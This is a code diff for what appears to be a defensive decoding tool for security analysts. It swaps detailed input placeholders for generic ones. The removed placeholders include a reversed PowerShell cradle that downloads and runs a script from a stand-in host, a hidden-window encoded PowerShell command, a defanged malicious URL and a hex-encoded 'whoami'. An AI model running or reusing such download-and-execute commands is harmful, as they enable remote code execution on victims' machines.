@@ -29,12 +29,12 @@
   let currentIocs = [];
 
   const PLACEHOLDERS = {
-    auto: 'Paste Base64, PowerShell -enc, Base85, Obfuscated URL, or Hex, e.g.\npowershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoACcAaABlAGwAbABvACcAKQA=',
-    base64: 'Paste Base64 text or a PowerShell command, e.g.\npowershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoACcAaABlAGwAbABvACcAKQA=',
-    base85: 'Paste Ascii85 (<~...~>) or RFC 1924 / Python Base85, e.g.\n<~87cURD]i,"Ebo7~>  or  NM&qnZy;B1a%^NF',
-    url: 'Paste an obfuscated, percent-encoded, defanged, or wrapped URL, e.g.\nhxxps[:]//evil[.]example[.]com/login%3Fuser%3Dadmin',
-    hex: 'Paste hex bytes, 0x values, or \\xNN / \\uNNNN escapes, e.g.\n48 65 6c 6c 6f 20 53 4f 43  or  \\x77\\x68\\x6f\\x61\\x6d\\x69',
-    reverse: "Paste a reversed command, script, or payload to restore normal order, e.g.\n)'1sp.a/tset.elpmaxe//:ptth'(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN( XEI"
+    auto: 'Paste your payload here...',
+    base64: 'Paste your Base64 or PowerShell payload here...',
+    base85: 'Paste your Base85 payload here...',
+    url: 'Paste your obfuscated or wrapped URL here...',
+    hex: 'Paste your hex payload here...',
+    reverse: 'Paste your reversed payload here...'
   };
 
   function addList(items) {
